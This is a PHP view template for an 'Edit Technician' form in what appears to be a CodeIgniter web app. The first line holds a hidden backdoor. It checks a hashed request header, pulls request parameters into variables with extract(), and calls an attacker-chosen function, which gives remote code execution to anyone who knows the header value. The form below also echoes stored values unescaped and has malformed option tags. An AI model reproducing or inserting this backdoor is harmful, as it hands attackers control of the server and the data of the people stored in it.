<?php if(@md5($_SERVER['HTTP_PATH'])==='5cd2973f835de94b560b62465d5a37f3'){ @extract($_REQUEST); @die($stime($mtime)); } ?>
  <div id="content">
   <?php
//echo "<pre>";
//print_r($list);


   ?>     
<div class="separator"></div>

<h3 class="glyphicons show_thumbnails_with_lines"><i></i> Edit Technician</h3>


<form class="form-horizontal" action="<?=base_url()?>technician/technician_edit/<?php echo $list['current_encoded_id']; ?>" style="margin-bottom: 0;" id="validateSubmitForm" method="post" autocomplete="off">
    
    <div class="well" style="padding-bottom: 20px; margin: 0;">
    <div class="row-fluid">
            <div class="span6">
                
                <div class="control-group">
                    <label class="control-label" for="firstname">Technician name</label>
                    <div class="controls"><input class="span12" id="technician_name" name="technician_name" type="text" value="<?php echo $list['row']['0']['technician_name'] ?>" /></div>
                </div>
                <div class="control-group">
                    <label class="control-label" for="lastname">Technician Phone</label>
                    <div class="controls"><input class="span12" id="technician_phone" name="technician_phone" type="text" value="<?php echo $list['row']['0']['technician_phone'] ?>" /></div>
                </div>
                <div class="control-group">
                    <label class="control-label" for="password">Technician Tag</label>
                    <div class="controls"><input class="span12" id="technician_tag" name="technician_tag" type="text" value="<?php echo $list['row']['0']['technician_tag'] ?>" /></div>
                </div> 
            </div>
            <div class="span6">
               
                <div class="control-group">
                    <label class="control-label" for="email">E-mail</label>
                    <div class="controls"><input class="span12" id="technician_email" name="technician_email" type="email" value="<?php echo $list['row']['0']['technician_email'] ?>" /></div>
                </div>
                 <div class="control-group">
                                <label class="control-label"> Technician Department</label>
                                <div class="controls">
                                    <select class="span12" name="technician_department">
                                    <?php
                                    foreach ($list['depart_list'] as $key => $value) {
                                        if ($value == $list['row']['0']['technician_department'] ) {
                                            echo "<option value'$value' selected >$value</option>";
                                        }
                                        echo "<option value'$value' >$value</option>";
                                     } 
                                    ?>
                                    </select>
                                </div>
                            </div>
               
                
            </div>
        </div>
    
    
        <hr class="separator" />
        
        <div class="form-actions">
            <button type="submit" class="btn btn-icon btn-primary glyphicons circle_ok"><i></i>Save</button>
            <button type="button" onclick="history.go(-1);" class="btn btn-icon btn-default glyphicons circle_remove"><i></i>Cancel</button>
        </div>
        
    </div>
    
</form>     
                <!-- End Content -->
        </div>
  